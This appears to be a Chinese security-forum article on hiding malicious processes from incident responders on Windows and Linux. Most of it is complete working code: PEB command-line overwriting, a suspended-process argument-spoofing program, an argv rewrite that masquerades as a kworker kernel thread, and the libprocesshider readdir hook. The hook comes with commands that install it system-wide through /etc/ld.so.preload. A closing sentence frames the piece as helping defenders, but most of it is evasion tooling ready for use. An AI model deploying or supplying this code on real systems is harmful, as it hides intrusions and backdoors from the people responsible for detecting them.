前言
==

当我们运行恶意命令后，应急人员可以通过ps排查出具体命令参数，那如果我们可以更改进程名称又或者是进程参数，就可以尽可能慢的被应急人员发现我们的可疑命令，提高进程存活时间。

Windows
=======

在Windows中，进程环境块PEB存储着每个进程的运行时数据，PEB包含的数据有启动参数、程序基地址等。我们可以通过修改进程PEB中的值来达到隐藏进程参数的目的。

我们可以通过windbg执行`!peb`命令可以看到当前进程的PEB结构体：

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-df5f12d6f32a07b7bad549214b295573b2a452e1.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-df5f12d6f32a07b7bad549214b295573b2a452e1.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-1e2e537fba460aaf695aa81278080c6a89899641.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-1e2e537fba460aaf695aa81278080c6a89899641.png)

```php
dt _RTL_USER_PROCESS_PARAMETERS 0x00000000`00be2560
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-6edf88c07cf2e2f9065ae5aba4e71c432c530ed7.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-6edf88c07cf2e2f9065ae5aba4e71c432c530ed7.png)

[NtQueryInformationProcess](https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess)函数可以获取进程信息，当然包括PEB，那思路也就有了，通过NtQueryInformationProcess获取进程信息并进行修改，网上也有现成的代码：

[https://www.ired.team/offensive-security/defense-evasion/masquerading-processes-in-userland-through-\_peb](https://www.ired.team/offensive-security/defense-evasion/masquerading-processes-in-userland-through-_peb)

这里我编译成x64位的，且在VS2019中配置“附加包含目录”为`$(ProjectDir)`：

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-d0ea92451ed52e7b4bfae8c716114f7d523549f9.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-d0ea92451ed52e7b4bfae8c716114f7d523549f9.png)

但是上面文章中的的程序执行完就结束了，没法直观看出commandline被改了，因此可以加个getchar()等待来直观看下结果：

```php
#include "Windows.h"
#include "winternl.h"
#include "stdio.h"

typedef NTSTATUS(*MYPROC) (HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

int main()
{
    HANDLE h = GetCurrentProcess();
    PROCESS_BASIC_INFORMATION ProcessInformation;
    ULONG lenght = 0;
    HINSTANCE ntdll;
    MYPROC GetProcessInformation;
    wchar_t commandline[] = L"C:\\windows\\system32\\notepad.exe";
    ntdll = LoadLibrary(TEXT("Ntdll.dll"));

    //resolve address of NtQueryInformationProcess in ntdll.dll
    GetProcessInformation = (MYPROC)GetProcAddress(ntdll, "NtQueryInformationProcess");

    //get _PEB object
    (GetProcessInformation)(h, ProcessBasicInformation, &ProcessInformation, sizeof(ProcessInformation), &lenght);

    //replace commandline and imagepathname
    ProcessInformation.PebBaseAddress->ProcessParameters->CommandLine.Buffer = commandline;
    ProcessInformation.PebBaseAddress->ProcessParameters->ImagePathName.Buffer = commandline;
    getchar();
    return 0;

}
```

看到commandline已被更改：

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-1c4d6d6cae3082d987ce04da6b1bdc419f1f00d2.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-1c4d6d6cae3082d987ce04da6b1bdc419f1f00d2.png)

因为我们的恶意程序是单文件的，点击执行就上线了，配合上面的技术可能不是很优雅，感觉起不到啥作用，但是如果是带参数的恶意程序，如果把进程参数改了，那就比较优雅了，起到了一点混淆的作用。在[argument\_spoofing.cpp](https://gist.github.com/xpn/1c51c2bfe19d33c169fe0431770f3020#file-argument_spoofing-cpp)也提供了对应的思路：

- 创建挂起的进程
- 修改进程PEB
- 恢复进程运行

代码如下：

```php
#include <iostream>
#include <Windows.h>
#include <winternl.h>

typedef NTSTATUS(*NtQueryInformationProcess2)(
    IN HANDLE,
    IN PROCESSINFOCLASS,
    OUT PVOID,
    IN ULONG,
    OUT PULONG
    );

void* readProcessMemory(HANDLE process, void *address, DWORD bytes) {
    SIZE_T bytesRead;
    char *alloc;

    alloc = (char *)malloc(bytes);
    if (alloc == NULL) {
        return NULL;
    }

    if (ReadProcessMemory(process, address, alloc, bytes, &bytesRead) == 0) {
        free(alloc);
        return NULL;
    }

    return alloc;
}

BOOL writeProcessMemory(HANDLE process, void *address, void *data, DWORD bytes) {
    SIZE_T bytesWritten;

    if (WriteProcessMemory(process, address, data, bytes, &bytesWritten) == 0) {
        return false;
    }

    return true;
}

int main(int argc, char **canttrustthis)
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    CONTEXT context;
    BOOL success;
    PROCESS_BASIC_INFORMATION pbi;
    DWORD retLen;
    SIZE_T bytesRead;
    PEB pebLocal;
    RTL_USER_PROCESS_PARAMETERS *parameters;

    printf("Argument Spoofing Example by @_xpn_\n\n");

    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));

    // Start process suspended
    success = CreateProcessA(
        NULL, 
        (LPSTR)"powershell.exe -NoExit -c Write-Host 'This is just a friendly argument, nothing to see here'", 
        NULL, 
        NULL, 
        FALSE, 
        CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
        NULL, 
        "C:\\Windows\\System32\\", 
        &si, 
        &pi);

    if (success == FALSE) {
        printf("[!] Error: Could not call CreateProcess\n");
        return 1;
    }

    // Retrieve information on PEB location in process
    NtQueryInformationProcess2 ntpi = (NtQueryInformationProcess2)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryInformationProcess");
    ntpi(
        pi.hProcess, 
        ProcessBasicInformation, 
        &pbi, 
        sizeof(pbi), 
        &retLen
    );

    // Read the PEB from the target process
    success = ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &pebLocal, sizeof(PEB), &bytesRead);
    if (success == FALSE) {
        printf("[!] Error: Could not call ReadProcessMemory to grab PEB\n");
        return 1;
    }

    // Grab the ProcessParameters from PEB
    parameters = (RTL_USER_PROCESS_PARAMETERS*)readProcessMemory(
        pi.hProcess, 
        pebLocal.ProcessParameters, 
        sizeof(RTL_USER_PROCESS_PARAMETERS) + 300
    );

    // Set the actual arguments we are looking to use
    WCHAR spoofed[] = L"powershell.exe -NoExit -c Write-Host Surprise, arguments spoofed\0";
    success = writeProcessMemory(pi.hProcess, parameters->CommandLine.Buffer, (void*)spoofed, sizeof(spoofed));
    if (success == FALSE) {
        printf("[!] Error: Could not call WriteProcessMemory to update commandline args\n");
        return 1;
    }

    /////// Below we can see an example of truncated output in ProcessHacker and ProcessExplorer /////////

    // Update the CommandLine length (Remember, UNICODE length here)
    DWORD newUnicodeLen = 28;

    success = writeProcessMemory(
        pi.hProcess, 
        (char *)pebLocal.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length), 
        (void*)&newUnicodeLen, 
        4
    );
    if (success == FALSE) {
        printf("[!] Error: Could not call WriteProcessMemory to update commandline arg length\n");
        return 1;
    }

    // Resume thread execution*/
    ResumeThread(pi.hThread);
}
```

开启进程创建的事件，查看对应事件能看到事件记录到的是一个正常参数：

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-83cbe0d2c3bdaf19f998f6e0ca9859e5c0e674cc.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-83cbe0d2c3bdaf19f998f6e0ca9859e5c0e674cc.png)

执行的确是”恶意“命令：

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-e00be4f528db23f813d55ca71a359a78d07fbc6d.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-e00be4f528db23f813d55ca71a359a78d07fbc6d.png)

在Cobalt Strike中的`argue`命令，也是使用了类似的技术。

简单的配合shellcode加载和更改进程名，这样看到的就是"notepad.exe"：

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-ca55dfe6fc68d78197afe2d4fc08e18dc51a428c.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-ca55dfe6fc68d78197afe2d4fc08e18dc51a428c.png)

Linux
=====

在Linux中，查看进程主要通过ps、top等命令，这些命令都是通过/proc/pid/下的文件信息进行获取，因此如果我们能想办法修改掉/proc/pid/下的文件信息，就可以达到隐藏进程名的目的。

首先可以通过argv\[0\]来达到隐藏的进程名的目的，在[pupy](https://github.com/n1nj4sec/pupy/blob/unstable/pupy/packages/linux/all/hide_process.py)有示例代码：

```php
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Modifications: Nicolas VERDIER (contact@n1nj4.eu)
# Original author is unknown
# source : I received the original version of this code from a private message on reddit
import ctypes
import os

class Stat():
    def add(self, pid, comm, state, ppid, pgrp, session, tty_nr, tpgid, flags, minflt, cminflt, majflt, cmajflt, utime,
            stime, cutime, cstime, priority, nice, num_threads, itrealvalue, starttime, vsize, rss, rsslim, startcode,
            endcode, startstack, kstkesp, kstkeip, signal, blocked, sigignore, sigcatch, wchan, nswap, cnswap,
            exit_signal, processor, rt_priority, policy, delayacct_blkio_ticks, guest_time,
            cguest_time, start_data, end_data, start_brk, arg_start, arg_end, env_start, env_end, exit_code):

        self.argv  = (int(arg_start), int(arg_end))
        self.env = (int(env_start), int(env_end))

def parse_proc_stat():
    with open("/proc/self/stat", "r") as fh: # ?3.5+ specific
        a = tuple(fh.read().split())
    s = Stat()
    s.add(*a)
    return s

def memcpy(dest, source):
    start, end = dest
    if len(source) > end - start:
        raise ValueError("ma jel")
    ptr = ctypes.POINTER(ctypes.c_wchar)
    idx = 0
    write = ''
    for tmp in range(start, end-1):
        a = ctypes.cast(tmp, ptr)
        if idx >= len(source):
            write = "\x00"
        else:
            write = source[idx]
        a.contents.value = write
        idx += 1

def change_argv(argv="/bin/bash", env=""):
    info = parse_proc_stat()
    memcpy(info.argv, argv) #clean argv
    memcpy(info.env, env) #clean environ

if __name__=="__main__":
    print "pid: %s"%os.getpid()
    change_argv(argv="[kworker/2:0]")
    import time
    while True:
        time.sleep(1)
```

代码中通过修改argv\[0\]为`kworker`，因为`kworker`是内核进程，修改成这个名，可以起到混淆作用，这里我改成`ttesttttesttestes`方便演示，可以看到利用`ps -ef`命令看到的进程名变了：

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-2de49d65f54c3fbe540dce6e39206c915d8981ca.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-2de49d65f54c3fbe540dce6e39206c915d8981ca.png)

也可以通过通过bash的exec命令的-a参数改变进程名称(<https://mp.weixin.qq.com/s/hWd0EOaBgVbgTBjsdg7QfA>)

```php
exec -a "xxx" sleep 10000
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-00de282f9baef985760482ba4679bcdcdecb2a70.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-00de282f9baef985760482ba4679bcdcdecb2a70.png)

看到sleep命令变成了xxx。

因为ps源码直接调用的函数是opendir以及readdir，因此通过ld.so.preload hook 掉readdir等相关函数，只要发现有恶意进程的信息，就不显示，也可以达到隐藏进程的目的，可以参考[libprocesshider](https://github.com/gianlucaborello/libprocesshider)。这里以当程序中出现`hide_process.py`就不显示结果为例。

`hide_process.py`很简单，就是无限循环：

```php
#!/usr/bin/python
import time
while True:
    time.sleep(1)
```

运行：

```php
./hide_process.py
```

没hook前能看到进程：

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-bd45238aae28159f4a02469d297f5db0f169c752.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-bd45238aae28159f4a02469d297f5db0f169c752.png)

hook后：

```php
#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

/*
 * Every process with this name will be excluded
 */
static const char* process_to_filter = "hide_process.py";

/*
 * Get a directory name given a DIR* handle
 */
static int get_dir_name(DIR* dirp, char* buf, size_t size)
{
    int fd = dirfd(dirp);
    if(fd == -1) {
        return 0;
    }

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if(ret == -1) {
        return 0;
    }

    buf[ret] = 0;
    return 1;
}

/*
 * Get a process name given its pid
 */
static int get_process_name(char* pid, char* buf)
{
    if(strspn(pid, "0123456789") != strlen(pid)) {
        return 0;
    }

    char tmp[256];
    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);

    FILE* f = fopen(tmp, "r");
    if(f == NULL) {
        return 0;
    }

    if(fgets(tmp, sizeof(tmp), f) == NULL) {
        fclose(f);
        return 0;
    }

    fclose(f);

    int unused;
    sscanf(tmp, "%d (%[^)]s", &unused, buf);
    return 1;
}

#define DECLARE_READDIR(dirent, readdir)                                \
static struct dirent* (*original_##readdir)(DIR*) = NULL;               \
                                                                        \
struct dirent* readdir(DIR *dirp)                                       \
{                                                                       \
    if(original_##readdir == NULL) {                                    \
        original_##readdir = dlsym(RTLD_NEXT, #readdir);               \
        if(original_##readdir == NULL)                                  \
        {                                                               \
            fprintf(stderr, "Error in dlsym: %s\n", dlerror());         \
        }                                                               \
    }                                                                   \
                                                                        \
    struct dirent* dir;                                                 \
                                                                        \
    while(1)                                                            \
    {                                                                   \
        dir = original_##readdir(dirp);                                 \
        if(dir) {                                                       \
            char dir_name[256];                                         \
            char process_name[256];                                     \
            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
                strcmp(dir_name, "/proc") == 0 &&                       \
                get_process_name(dir->d_name, process_name) &&          \
                strcmp(process_name, process_to_filter) == 0) {         \
                continue;                                               \
            }                                                           \
        }                                                               \
        break;                                                          \
    }                                                                   \
    return dir;                                                         \
}

DECLARE_READDIR(dirent64, readdir64);
DECLARE_READDIR(dirent, readdir);
```

编译：

```php
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
sudo mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
```

动态链接库劫持后看不到对应进程：

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-95e5839edecdbc7ca048db7777e03d2d83ea7b72.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-95e5839edecdbc7ca048db7777e03d2d83ea7b72.png)

通过该方法，使用网上的diff ps和/proc下的文件排查隐藏进程方法也是失效的。

总结
==

本文从Windows和Linux两个方面介绍了隐藏进程名和进程参数的方法，展示了通过不同的技术手段来达到隐藏的目的，当然也是希望以攻促防，让运维人员熟悉常见的后门来达到尽快全面排查机器的目的。